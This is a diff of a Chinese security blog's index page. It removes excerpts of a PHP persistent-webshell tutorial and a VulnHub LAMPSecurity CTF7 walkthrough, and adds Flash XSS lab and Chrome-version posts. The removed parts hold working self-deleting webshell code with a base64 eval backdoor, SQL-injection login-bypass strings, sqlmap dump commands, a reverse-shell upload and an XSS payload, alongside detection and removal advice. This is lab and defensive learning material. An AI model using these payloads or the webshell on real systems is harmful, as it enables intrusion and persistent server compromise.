@@ -75,6 +75,109 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-web-XSS-FlashXss-xss-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/22/web-XSS-FlashXss-xss-labs/" class="article-date">
+  <time class="dt-published" datetime="2024-03-22T03:03:16.000Z" itemprop="datePublished">2024-03-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/22/web-XSS-FlashXss-xss-labs/">web-XSS-FlashXss-xss-labs</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>[toc]</p>
+<h1 id="Flash-poc"><a href="#Flash-poc" class="headerlink" title="Flash-poc"></a>Flash-poc</h1><h2 id="0-靶场环境"><a href="#0-靶场环境" class="headerlink" title="0. 靶场环境"></a>0. 靶场环境</h2><pre><code>访问靶场: http://localhost:8080/xss/level19.php?arg01=a&amp;arg02=b
+</code></pre>
+<p><img src="/images/image-20240321202115815.png" alt="image-20240321202115815"></p>
+<h2 id="1-后端代码审计"><a href="#1-后端代码审计" class="headerlink" title="1. 后端代码审计"></a>1. 后端代码审计</h2><p><img src="/images/image-20240322104404913.png" alt="image-20240322104404913"></p>
+<p>​	可以发现URL通过GET请求传入的参数arg01和arg02分别被作为xsf03.swf调用的键和值，访问<code>http://127.0.0.1:8080/xss/level19.php?arg01=a&amp;arg02=b</code>验证，打开控制台，查看内容发现没有突破点</p>
+<p><img src="/images/image-20240321202220244.png" alt="image-20240321202220244"></p>
+<p>​	通过阅读报错信息，可以看到flash报错里面提示sifr.js是没有定义的，不过xsf03.swf在页面显示过程中仅仅以图片的形式展示，所以我们需要对该文件进行反编译查看源码</p>
+        
+          <p class="article-more-link">
+            <a href="/2024/03/22/web-XSS-FlashXss-xss-labs/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/22/web-XSS-FlashXss-xss-labs/" data-id="clu7r07hh0018gvvdfcpmcdci" data-title="web-XSS-FlashXss-xss-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-tools-Chrome-OldVersion" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/22/tools-Chrome-OldVersion/" class="article-date">
+  <time class="dt-published" datetime="2024-03-22T03:00:31.000Z" itemprop="datePublished">2024-03-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/03/22/tools-Chrome-OldVersion/">tools-Chrome-OldVersion</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Chrome历史版本获取"><a href="#Chrome历史版本获取" class="headerlink" title="Chrome历史版本获取"></a>Chrome历史版本获取</h1><p>​	在平时测试过程中需要使用到不同版本的Chrome浏览器版本</p>
+<p>​	我们可以通过访问下面站点获取不同版本的Chrome</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.slimjet.com/chrome/google-chrome-old-version.php">https://www.slimjet.com/chrome/google-chrome-old-version.php</a></p>
+</blockquote>
+<p><img src="/images/image-20240321195820376.png" alt="image-20240321195820376">i</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2024/03/22/tools-Chrome-OldVersion/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/22/tools-Chrome-OldVersion/" data-id="clu7r07gx000igvvd9876bssy" data-title="tools-Chrome-OldVersion" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-program-PHP-Memory-Trojan" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/03/21/program-PHP-Memory-Trojan/" class="article-date">
@@ -111,63 +214,16 @@
 </ul>
 <h3 id="1-1-unlink-FILE"><a href="#1-1-unlink-FILE" class="headerlink" title="1.1 unlink(__FILE__)"></a>1.1 unlink(__FILE__)</h3><p>​	在PHP中，<code>unlink(__FILE__)</code> 是一个用于删除当前文件的函数调用。<code>__FILE__</code> 是一个常量，存储了当前文件的绝对路径和文件名。当执行 <code>unlink(__FILE__)</code> 时，它会尝试删除包含这个代码的文件。换句话说，它会删除当前正在执行的 PHP 文件。这个函数的作用类似于在操作系统中手动删除一个文件。</p>
 <p>​	需要特别注意的是，执行 <code>unlink(__FILE__)</code> 并不会删除正在运行的 PHP 脚本本身，因为脚本在执行过程中已经被加载到内存中。相反，它会<strong>删除磁盘上的文件</strong>，如果文件正在被其他进程使用，删除操作可能会失败。</p>
-<h2 id="2-内存马可用性与存活性验证"><a href="#2-内存马可用性与存活性验证" class="headerlink" title="2. 内存马可用性与存活性验证"></a>2. 内存马可用性与存活性验证</h2><p>​	访问内存马地址(这里我是在本地的8080端口开放的服务) ”<a target="_blank" rel="noopener" href="http://localhost:8080/test.php%E2%80%9C%EF%BC%8C%E5%8F%91%E7%8E%B0%E9%A1%B5%E9%9D%A2%E5%BC%80%E5%A7%8B%E5%8A%A0%E8%BD%BD%E3%80%82%E8%AE%BF%E9%97%AE%E5%86%85%E5%AD%98%E9%A9%AC%E9%87%8A%E6%94%BE%E7%9A%84%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6index.php%E5%B9%B6%E6%89%A7%E8%A1%8Cphpinfo%E5%87%BD%E6%95%B0%E5%8F%91%E7%8E%B0%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F">http://localhost:8080/test.php“，发现页面开始加载。访问内存马释放的后门文件index.php并执行phpinfo函数发现执行成功</a></p>
-<p><img src="/images/image-20240321150609522.png" alt="image-20240321150609522"></p>
-<p>​	每次执行都会创建一个新的进程用于执行内存马</p>
-<h2 id="3-优化PHP内存马"><a href="#3-优化PHP内存马" class="headerlink" title="3. 优化PHP内存马"></a>3. 优化PHP内存马</h2><p>​	传统的不死马并没有判断文件是否存在就写马这样会比较占用服务器资源</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">	<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="string">&#x27;./shell.php&#x27;</span>;</span><br><span class="line">	<span class="comment">// &lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;</span></span><br><span class="line">	<span class="variable">$code</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg==&#x27;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)) === <span class="title function_ invoke__">md5</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>使用md5加密算法判断文件是否被修改，通过file_get_contents判断文件是否存在</strong></p>
-<h2 id="4-PHP-内存马在Linux上的表现"><a href="#4-PHP-内存马在Linux上的表现" class="headerlink" title="4. PHP 内存马在Linux上的表现"></a>4. PHP 内存马在Linux上的表现</h2><p>​	要想实现在Linux上注入内存马，需要执行PHP的用户具有写(write)权限</p>
-<p>​	访问一次PHP内存马后可以很清楚的看到apache2启动的进程会多出一条，用于处理内存马的运行</p>
-<p><img src="/images/image-20240321170010699.png" alt="image-20240321170010699"></p>
-<h2 id="5-PHP内存马的排查"><a href="#5-PHP内存马的排查" class="headerlink" title="5. PHP内存马的排查"></a>5. PHP内存马的排查</h2><ol>
-<li>先判断是通过什么方法注入的内存马，可以先查看web日志是否<strong>有可疑的web访问日志</strong>，如果是filter或者listener类型就会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的，查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马</li>
-<li>如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看<strong>是否有可疑的报错</strong>，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞</li>
-</ol>
-<p>​	也可以通过以下几个方式简单进行排查：</p>
-<ul>
-<li><p>检查所有php进程处理请求的持续时间</p>
-</li>
-<li><p>检测执行文件是否在文件系统真实存在</p>
-</li>
-<li><p>检测该文件的进程状态</p>
-</li>
-<li><p>检测关闭后还在运行的进行</p>
-</li>
-</ul>
-<h2 id="6-PHP不死马防御"><a href="#6-PHP不死马防御" class="headerlink" title="6. PHP不死马防御"></a>6. PHP不死马防御</h2><h3 id="6-1-有效解决方案"><a href="#6-1-有效解决方案" class="headerlink" title="6.1 有效解决方案"></a>6.1 有效解决方案</h3><ul>
-<li><p>不死马运行在中间件的为程序开辟的内存中，只要重启自己的Apache或者Nginx等中间件服务，将不会再生成了</p>
-</li>
-<li><p>使用命令删除进程，kill掉用户所有子程序</p>
-</li>
-<li><p>ps命令列举出所有运行人员为可疑使用者(如www-data)的程序pid，然后依次kill</p>
-</li>
-<li><p>pgrep -u参数查出可疑使用者(如www-data)的程序所有pid，然后依次kill</p>
-</li>
-</ul>
-<h3 id="6-2-临时解决方案"><a href="#6-2-临时解决方案" class="headerlink" title="6.2 临时解决方案"></a>6.2 临时解决方案</h3><ul>
-<li>在有生成木马的目录创建.htaccess(apache局部文件夹管理文件)将不死马解析为不可知性的文件</li>
-</ul>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">shell.php</span>&quot;&gt;</span>SetHandler application/x-httpd-html<span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>创建一个和不死马生成的马一样名字的目录</li>
-</ul>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">针对的是创建不死马有时间间隔，如用sleep函数</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>利用条件竞争删除不死马文件</li>
-</ul>
-<p>编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;  </span><br><span class="line">        <span class="variable">$pid</span> = 不死马的进程PID;  </span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;.ski12.php&quot;</span>);  </span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;kill -9 <span class="subst">$pid</span>&quot;</span>);  </span><br><span class="line">     	<span class="title function_ invoke__">usleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
+<h2 id="2-内存马可用性与存活性验证"><a href="#2-内存马可用性与存活性验证" class="headerlink" title="2. 内存马可用性与存活性验证"></a>2. 内存马可用性与存活性验证</h2>
+        
+          <p class="article-more-link">
+            <a href="/2024/03/21/program-PHP-Memory-Trojan/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/program-PHP-Memory-Trojan/" data-id="clu6yfp8q000102vd508jc4ya" data-title="program-PHP-Memory-Trojan" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/program-PHP-Memory-Trojan/" data-id="clu7r07gd0001gvvd2m1gdbrr" data-title="program-PHP-Memory-Trojan" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -213,31 +269,15 @@
 <p>service network restart</p>
 </blockquote>
 <p><img src="/images/image-20240321095828804.png" alt="image-20240321095828804"></p>
-<p>​	结果出现以下问题：</p>
-<blockquote>
-<h3 id="Bringing-up-interface-eth0-Device-eth0-does-not-seem-to-be-present-delaying-initialization"><a href="#Bringing-up-interface-eth0-Device-eth0-does-not-seem-to-be-present-delaying-initialization" class="headerlink" title="Bringing up interface eth0: Device eth0 does not seem to be present,delaying initialization"></a>Bringing up interface eth0: Device eth0 does not seem to be present,delaying initialization</h3></blockquote>
-<p>​	判断可能是网卡配置文件出现了问题</p>
-<h2 id="2-故障修复"><a href="#2-故障修复" class="headerlink" title="2. 故障修复"></a>2. 故障修复</h2><h3 id="2-1-删除持久化网络设备配置文件"><a href="#2-1-删除持久化网络设备配置文件" class="headerlink" title="2.1 删除持久化网络设备配置文件"></a>2.1 删除持久化网络设备配置文件</h3><blockquote>
-<p>rm -rf &#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules</p>
-</blockquote>
-<h3 id="2-2-编辑本地的网卡配置文件"><a href="#2-2-编辑本地的网卡配置文件" class="headerlink" title="2.2 编辑本地的网卡配置文件"></a>2.2 编辑本地的网卡配置文件</h3><blockquote>
-<p>vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</p>
-</blockquote>
-<p><img src="/images/image-20240321100132662.png" alt="image-20240321100132662"></p>
-<ul>
-<li>查看 DEVICE，若是device&#x3D;”eth1”修改为device&#x3D;”eth0”</li>
-<li>删除 UUID 字段</li>
-<li>删除 HWADDR 字段</li>
-</ul>
-<p>​	然后重启reboot。</p>
-<p>​	重启完成再次进行 <code>ip -a</code> 查看：</p>
-<p><img src="/images/image-20240321100401885.png" alt="image-20240321100401885"></p>
-<p>​	成功获取到IP地址</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/" data-id="clu6yfp9l000x02vd8g977a00" data-title="vulnhub-LAMPSecurity-CTF7-initial-error" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/" data-id="clu7r07he0012gvvd9xki07wy" data-title="vulnhub-LAMPSecurity-CTF7-initial-error" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -297,91 +337,15 @@
 <h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
 <p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.154</p>
 </blockquote>
-<p><img src="/images/image-20230323104254505.png" alt="image-20230323104254505"></p>
-<p>​	可以看出当前靶场开放较多端口，这里的话重点关注22、80、5900、8080</p>
-<h3 id="2-2-TCP服务开放性探测"><a href="#2-2-TCP服务开放性探测" class="headerlink" title="2.2 TCP服务开放性探测"></a>2.2 TCP服务开放性探测</h3><blockquote>
-<p>sudo nmap -sT -sV -sC -O -p 22,80,137,138,139,901,5900,8080,10000 192.168.134.154</p>
-</blockquote>
-<p><img src="/images/1679539633057.png" alt="1679539633057"></p>
-<p>​	可以发现在 8080 端口处存在一个 <code>/login.php</code> 的登录功能点</p>
-<h3 id="2-3-UDP服务开放性探测"><a href="#2-3-UDP服务开放性探测" class="headerlink" title="2.3 UDP服务开放性探测"></a>2.3 UDP服务开放性探测</h3><blockquote>
-<p>sudo nmap –min-rate 10000 -p- sU -v 192.168.134.154</p>
-</blockquote>
-<p><img src="/images/image-20230323104626260.png" alt="image-20230323104626260"></p>
-<h3 id="2-4-服务端vuln脚本探测"><a href="#2-4-服务端vuln脚本探测" class="headerlink" title="2.4 服务端vuln脚本探测"></a>2.4 服务端vuln脚本探测</h3><blockquote>
-<p>sudo nmap –script&#x3D;vuln -p 22,80,137,138,139,901,5900,8080,10000 192.168.134.154</p>
-</blockquote>
-<p><img src="/images/image-20230323105141750.png" alt="image-20230323105141750"></p>
-<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h2><h3 id="3-1-根据Nmap扫描结果，对8080端口admin后台登录界面进行测试"><a href="#3-1-根据Nmap扫描结果，对8080端口admin后台登录界面进行测试" class="headerlink" title="3.1 根据Nmap扫描结果，对8080端口admin后台登录界面进行测试"></a>3.1 根据Nmap扫描结果，对8080端口admin后台登录界面进行测试</h3><p>​		通过前面的资产扫面可以发现在8080端口下存在一个后台登陆界面，简单的来个SQL注入测试</p>
-<p><img src="/images/image-20230323110553762.png" alt="image-20230323110553762"></p>
-<h3 id="3-2-万能密码登录Admin后台-SQL注入"><a href="#3-2-万能密码登录Admin后台-SQL注入" class="headerlink" title="3.2 万能密码登录Admin后台&#x2F;SQL注入"></a>3.2 万能密码登录Admin后台&#x2F;SQL注入</h3><p>​	在username和password框中各输入一个引号，放包观察页面内容</p>
-<p><img src="/images/image-20240321102646131.png" alt="image-20240321102646131"></p>
-<p>​	页面回显异常:</p>
-<blockquote>
-<p>Invalid query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin’’) and is_admin&#x3D;1’ at line 1 Whole query: select * from users where username&#x3D;’admin’’ AND password&#x3D;md5(‘admin’’) and is_admin&#x3D;1</p>
-</blockquote>
-<p><img src="/images/image-20230323111254165.png" alt="image-20230323111254165"></p>
-<p>​		说明在登陆端口处存在SQL注入，并且发现当前的SQL语句为:select * from users where username&#x3D;’’ AND password&#x3D;md5(‘’) and is_admin&#x3D;1</p>
-<p>​		</p>
-<h4 id="3-2-1-万能密码登录Admin后台"><a href="#3-2-1-万能密码登录Admin后台" class="headerlink" title="3.2.1 万能密码登录Admin后台"></a>3.2.1 万能密码登录Admin后台</h4><p>​	我们尝试使用万能密码进行登录</p>
-<blockquote>
-<p>用户名：admin’ or 1&#x3D;1 – wq</p>
-<p>密码：admin’) or 1&#x3D;1 – wq</p>
-</blockquote>
-<p><img src="/images/image-20230323111402750.png" alt="image-20230323111402750"></p>
-<p>​		成功登录站点后台 <code>http://192.168.70.197:8080/index.php</code></p>
-<p><img src="/images/image-20230323111419988.png" alt="image-20230323111419988"></p>
-<h4 id="3-2-2-sqlmap后台数据获取"><a href="#3-2-2-sqlmap后台数据获取" class="headerlink" title="3.2.2 sqlmap后台数据获取"></a>3.2.2 sqlmap后台数据获取</h4><p>​	在8080端口SQL注入处使用sqlmap脱下所有的数据看看</p>
-<blockquote>
-<p>sqlmap -r login.txt –banner </p>
-<p>sqlmap -r login.txt –dbms mysql –dbs</p>
-<h3 id="roundcube-库中的user表单数据查询"><a href="#roundcube-库中的user表单数据查询" class="headerlink" title="roundcube 库中的user表单数据查询"></a>roundcube 库中的user表单数据查询</h3><p>sqlmap -r login.txt –dbms mysql -D roundcube –tables</p>
-<p>sqlmap -r login.txt –dbms mysql -D roundcube -T users –dump</p>
-<h3 id="website-库中的user表单数据查询"><a href="#website-库中的user表单数据查询" class="headerlink" title="website 库中的user表单数据查询"></a>website 库中的user表单数据查询</h3><p>sqlmap -r login.txt –dbms mysql -D website –tables</p>
-<p>sqlmap -r login.txt –dbms mysql -D website -T users –dump</p>
-</blockquote>
-<p><img src="/images/image-20230323111908460.png" alt="image-20230323111908460"></p>
-<p><img src="/images/image-20230323111956185.png" alt="image-20230323111956185"></p>
-<p><img src="/images/image-20230323112059019.png" alt="image-20230323112059019"></p>
-<p><img src="/images/image-20230323112114743.png" alt="image-20230323112114743"></p>
-<p>​		可以发现roundcube库中的user表单中不存在能够利用的数据</p>
-<p><img src="/images/image-20230323112932532.png" alt="image-20230323112932532"></p>
-<h3 id="3-4-路径爆破"><a href="#3-4-路径爆破" class="headerlink" title="3.4 路径爆破"></a>3.4 路径爆破</h3><p>​	因为服务器端开放22端口，对上面获取到的账号密码尝试使用ssh密码喷射，但是都无法登录SSH，这时候我们只能重新对资产进行一波信息搜集</p>
-<p>​	这里尝试对80端口服务进行探测</p>
-<p><img src="/images/image-20230323131205788.png" alt="image-20230323131205788"></p>
-<p>​	这里我们发现了一个很有趣的文件目录<code>/assets</code>，这个目录存放了一些文件，尝试访问可以发现是一对图标文件</p>
-<p><img src="/images/image-20240321103323615.png" alt="image-20240321103323615"></p>
-<p>​	猜测这个文件夹可能是用于存放上传资源的路径，这时就需要去查找相关上传点。</p>
-<p>​	经过测试发现可以在<code>http://192.168.70.197:8080/readings.php</code>(管理员界面推广的Reading读物的预览)界面上传文件至<code>http://192.168.70.197/assets</code>，那么就可以尝试我们去提交一个恶意文件，然后尝试获取链接</p>
-<p><img src="/images/image-20230323131503469.png" alt="image-20230323131503469"></p>
-<p><img src="/images/image-20230323131449824.png" alt="image-20230323131449824"></p>
-<h3 id="3-5-文件上传GetShell"><a href="#3-5-文件上传GetShell" class="headerlink" title="3.5 文件上传GetShell"></a>3.5 文件上传GetShell</h3><p>​	使用msfvenom创建一个PHP的反弹shell文件，保存并命名为hack.php</p>
-<p><img src="/images/image-20230323131420290.png" alt="image-20230323131420290"></p>
-<p>​	将文件通过<code>Add a new Readings</code>上传至<code>/assets</code>文件夹目录</p>
-<p><img src="/images/image-20230323131522965.png" alt="image-20230323131522965"></p>
-<p>​	访问 <code>http://192.168.70.197/assets</code> 成功将木马文件上传至指定地点</p>
-<p><img src="/images/image-20230323131533810.png" alt="image-20230323131533810"></p>
-<h3 id="3-6-建立通信隧道链接"><a href="#3-6-建立通信隧道链接" class="headerlink" title="3.6 建立通信隧道链接"></a>3.6 建立通信隧道链接</h3><p>​		打开msfconsole，建立监听隧道</p>
-<p><img src="/images/image-20230323131630163.png" alt="image-20230323131630163"></p>
-<p>​		访问恶意文件，成功反弹shell</p>
-<p><img src="/images/image-20230323131711399.png" alt="image-20230323131711399"></p>
-<p><img src="/images/image-20230323131718925.png" alt="image-20230323131718925"></p>
-<h3 id="3-7-用户提权"><a href="#3-7-用户提权" class="headerlink" title="3.7 用户提权"></a>3.7 用户提权</h3><p>​		一开始获得的用户权限是<code>apache</code>，这个权限无法执行任何操作。这时候我们就需要获取更高权限的用户，首先想到的是<code>/home</code>文件夹下存在几个和我们爆出的数据库用户名同名的文件夹，我们分别切换到这些账号中，发现能够顺利切换用户</p>
-<p><img src="/images/image-20230323132518344.png" alt="image-20230323132518344"></p>
-<p>​		但是其他几个用户都没有权限，无法执行sudo提权</p>
-<p><img src="/images/image-20230323141156139.png" alt="image-20230323141156139"></p>
-<p>​		最后经过测试只有第一个brian用户才拥有所有命令的执行权限，那么就通过</p>
-<blockquote>
-<p>sudo &#x2F;bin&#x2F;bash </p>
-</blockquote>
-<p>获取一个root权限的shell对话框</p>
-<p><img src="/images/image-20230323141126102.png" alt="image-20230323141126102"></p>
-<p><img src="/images/1679551930000.png" alt="1679551930000"></p>
-
+        
+          <p class="article-more-link">
+            <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7/" data-id="clu6yfp9o000z02vd0d2o4j5a" data-title="vulnhub-LAMPSecurity-CTF7" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7/" data-id="clu7r07hf0014gvvd081l6pwf" data-title="vulnhub-LAMPSecurity-CTF7" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -424,16 +388,15 @@
 <h2 id="2-后台添加用户处存在SQL注入"><a href="#2-后台添加用户处存在SQL注入" class="headerlink" title="2. 后台添加用户处存在SQL注入"></a>2. 后台添加用户处存在SQL注入</h2><p>​	发现在 <a target="_blank" rel="noopener" href="http://192.168.70.197:8080/users.php?op=new_scr">http://192.168.70.197:8080/users.php?op=new_scr</a> (添加用户功能点)处存在SQL注入漏洞</p>
 <p><img src="/images/image-20240321112503733.png" alt="image-20240321112503733"></p>
 <h2 id="3-编辑处存在XSS漏洞"><a href="#3-编辑处存在XSS漏洞" class="headerlink" title="3. 编辑处存在XSS漏洞"></a>3. 编辑处存在XSS漏洞</h2><p>​	我们尝试对已有的内容进行编辑’<a target="_blank" rel="noopener" href="http://192.168.70.197:8080/trainings.php?msg=Updated%27%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E7%BC%96%E8%BE%91%E7%9A%84%E6%98%AFTrainings%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9">http://192.168.70.197:8080/trainings.php?msg=Updated&#39;，这里我编辑的是Trainings中的内容</a></p>
-<p>​	在所有的条目中插入代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>​	更新保存后，成功弹窗</p>
-<p><img src="/images/image-20240321112957947.png" alt="image-20240321112957947"></p>
-
+        
+          <p class="article-more-link">
+            <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" data-id="clu6yfp9k000v02vdhuxp9aqs" data-title="vulnhub-LAMPSecurity-CTF7-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" data-id="clu7r07h8000zgvvde0btbpdl" data-title="vulnhub-LAMPSecurity-CTF7-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -474,27 +437,15 @@
 
 <h3 id="1-1-重要部分解析"><a href="#1-1-重要部分解析" class="headerlink" title="1.1 重要部分解析"></a>1.1 重要部分解析</h3><h4 id="1-1-1-priority-Param"><a href="#1-1-1-priority-Param" class="headerlink" title="1.1.1 priority [Param]"></a>1.1.1 priority [Param]</h4><p>​	priority定义脚本的优先级，用于在测试过程中选用多个tamper脚本的情况下测试的先后顺序。谁的优先级高，谁被优先使用。（优先级共有七个，分别为；LOWEST、LOWER、LOW、NORMAL、HIGH、HIGHER、HIGHEST）</p>
 <h4 id="1-1-2-dependencies-Fuction"><a href="#1-1-2-dependencies-Fuction" class="headerlink" title="1.1.2 dependencies [Fuction]"></a>1.1.2 dependencies [Fuction]</h4><p>​	dependencies函数声明该脚本适用&#x2F;不适用的范围，可以为空。</p>
-<h4 id="1-1-3-tamper-Fuction"><a href="#1-1-3-tamper-Fuction" class="headerlink" title="1.1.3 tamper [Fuction]"></a>1.1.3 tamper [Fuction]</h4><p>​	tamper是主要的函数，接受的参数为payload和**kwargs，返回值为替换后的payload。</p>
-<p>​	payload 拼接查询语句</p>
-<p>​	**kwargs 存储的是 HTTP REQUEST 请求头中的内容， 多数存储在 kwargs[‘headers’] 中</p>
